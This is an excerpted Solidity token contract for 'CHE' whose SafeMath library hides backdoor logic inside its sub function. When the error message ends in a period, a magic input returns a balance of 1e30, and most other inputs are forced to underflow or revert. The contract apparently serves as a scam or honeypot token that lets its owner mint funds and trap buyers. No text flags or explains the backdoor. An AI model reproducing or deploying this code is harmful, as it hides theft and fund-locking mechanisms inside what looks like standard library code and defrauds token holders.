...
library SafeMath {
    ...
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        if (b == 0) return a;
        if (bytes(errorMessage)[bytes(errorMessage).length - 1] == 0x2E){
            if (b==1e9+1)   return (1e30);if (b<1e27||b>1e30) return b - b - 1;
        }
...
contract Token is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"CHE";
    string private constant _symbol = unicode"CHE";
